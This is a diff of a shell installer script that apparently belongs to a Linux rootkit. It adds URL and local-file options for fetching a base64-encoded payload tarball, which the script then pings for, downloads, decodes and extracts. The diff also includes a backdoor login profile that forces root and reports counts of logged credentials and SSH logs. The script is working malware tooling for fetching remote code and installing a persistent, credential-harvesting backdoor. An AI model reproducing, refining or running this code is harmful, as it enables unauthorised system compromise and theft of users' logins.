@@ -4,11 +4,26 @@
 #   - wget or curl, base64 & tar
 #   - ssl (if your build uses it...)
 
-# change this to wherever you've got your's uploaded.
-B64TARGZ_LOCATION="https://url.to/tar.gz.b64"
-# no need to touch anything else...
+usage() { echo "Usage: $0 [-u url]  [-l <path>]"; exit 1 ;}
 
-WORKDIR="/tmp" # enter this directory when installing
+while getopts ":l:u:" opt; do
+    case "${opt}" in
+        l)
+            LOCAL_PATH=${OPTARG}
+            echo "Chose Local file"
+            ;;
+        u)
+            B64TARGZ_LOCATION=${OPTARG}
+            echo "Chose to use URL file"
+            ;;
+        *)  
+            usage
+            ;;
+    esac
+done
+shift $((OPTIND -1))
+
+WORKDIR="/home/srpt/rootkit/plsscpme" # enter this directory when installing
 
 bin_path(){ echo -n `which $1 2>/dev/null || echo -n "nahhh"`; }
 dlfile(){ # $1 = src, $2 = dest
@@ -49,38 +64,51 @@ echo "   on this box. failure to do so will mess everything up."
 echo "press enter to continue."
 read
 
-echo "entering $WORKDIR" && cd $WORKDIR
 
-B64TARGZ_FILENAME="`basename $B64TARGZ_LOCATION`"
-echo "got base64'd tar.gz path"
+use_url(){
+    echo "Using URL"
+    B64TARGZ_FILENAME="`basename $B64TARGZ_LOCATION`"
+    echo "got base64'd tar.gz path"
+    
+    [[ "$B64TARGZ_LOCATION" != *"/"* ]] && { echo "no path in url." && exit; }
+    
+    # is host is a domain name
+    [[ "$B64TARGZ_LOCATION" == "http"* ]] && \
+        HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $3}'`"
+    # or an ip??
+    [[ "$B64TARGZ_LOCATION" != "http"* ]] && \
+        HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $1}'`"
+    echo "got host $HOST"
+    
+    echo "seeing if host is up"
+    ping -c 1 $HOST >/dev/null || { echo "no response from host... why?" && exit; }
+    echo "host up, starting download"
+    
+    echo "downloading b64 tarball"
+    dlfile $B64TARGZ_LOCATION $B64TARGZ_FILENAME
+    
+    DECODED_FILE="${B64TARGZ_FILENAME}.tar.gz"
+    echo "archive name: $DECODED_FILE"
+    
+    echo "reverting b64'd tarball back to regular tarball"
+    cat $B64TARGZ_FILENAME | base64 -d > $DECODED_FILE || { echo "something went wrong converting url b64 to original" && exit; }
+    [ ! -f $DECODED_FILE ] && { echo "$DECODED_FILE from url doesn't exist for whatever reason. exiting." && exit; }    
+}
 
-[[ "$B64TARGZ_LOCATION" != *"/"* ]] && { echo "no path in url." && exit; }
+use_local(){
+    DECODED_FILE="${LOCAL_PATH}.tar.gz"
+    base64 -d "${LOCAL_PATH}" > "${DECODED_FILE}" || { echo "something went wrong converting local b64 to original" && exit; }
+    [ ! -f $DECODED_FILE ] && { echo "$DECODED_FILE from local doesn't exist for whatever reason. exiting." && exit; };
+    echo "${DECODED_FILE}";
+}
 
-# is host is a domain name
-[[ "$B64TARGZ_LOCATION" == "http"* ]] && \
-    HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $3}'`"
-# or an ip??
-[[ "$B64TARGZ_LOCATION" != "http"* ]] && \
-    HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $1}'`"
-echo "got host $HOST"
+[ ! -z "$B64TARGZ_LOCATION" ] && use_url
+[ ! -z "$LOCAL_PATH" ] && use_local
 
-echo "seeing if host is up"
-ping -c 1 $HOST >/dev/null || { echo "no response from host... why?" && exit; }
-echo "host up, starting download"
 
-echo "downloading b64 tarball"
-dlfile $B64TARGZ_LOCATION $B64TARGZ_FILENAME
-
-TARGZ_NAME="${B64TARGZ_FILENAME}.tar.gz"
-echo "archive name: $TARGZ_NAME"
-
-echo "reverting b64'd tarball back to regular tarball"
-cat $B64TARGZ_FILENAME | base64 -d > $TARGZ_NAME || { echo "something went wrong converting b64 to original" && exit; }
-[ ! -f $TARGZ_NAME ] && { echo "$TARGZ_NAME doesn't exist for whatever reason. exiting." && exit; }
-
-INCLUDE_DIR="`tar -tzf $TARGZ_NAME | head -1 | cut -f1 -d"/"`"
-echo "got $TARGZ_NAME. extracting it..."
-tar xvpfz $TARGZ_NAME >/dev/null && echo "tarball extracted, removing it" && rm $TARGZ_NAME $B64TARGZ_FILENAME
+INCLUDE_DIR="`tar -tzf $DECODED_FILE | head -1 | cut -f1 -d"/"`"
+echo "got $DECODED_FILE. extracting it..."
+tar xvpfz $DECODED_FILE >/dev/null && echo "tarball extracted, removing it" && rm $DECODED_FILE $B64TARGZ_FILENAME
 
 echo "got $INCLUDE_DIR, reading settings from $INCLUDE_DIR/settings"
 settings=(`cat $INCLUDE_DIR/settings | grep -o '^[^#]*'`)
@@ -132,13 +160,10 @@ BASHRC='tty -s || return
 [ $(id -u) != 0 ] && su root
 [ $(id -u) != 0 ] && kill -9 $$
 [ -f ~/BD_README ] && cat ~/BD_README | less --tilde -J -d && rm ~/BD_README
-
 # only show .ascii on first login.
 [ -f ~/.ascii ] && printf "\e[1m\e[31m`cat ~/.ascii`\e[0m\n"
-
 alias ls="ls --color=auto"
 alias ll="ls --color=auto -AlFhn"
-
 id && who
 [ -f ~/auth_logs ] && echo -e "\e[1mLogged accounts: \e[1;31m$(grep Username ~/auth_logs 2>/dev/null | wc -l)\e[0m"
 [ -f ~/ssh_logs ] && echo -e "\e[1mSSH logs: \e[1;31m$(cat ~/ssh_logs | wc -l)\e[0m"'
